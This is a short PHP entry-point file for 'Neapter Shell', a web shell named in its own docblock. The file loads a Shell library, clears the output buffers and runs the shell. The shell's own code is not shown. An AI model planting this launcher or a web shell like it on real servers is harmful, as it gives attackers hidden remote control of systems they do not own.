<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

require_once dirname(__FILE__) . '/Lib/Shell.php';

/* Turn off all buffers*/
while (ob_get_level()) {
    ob_end_clean();
}

$oShell = new Shell();
$oShell->get();
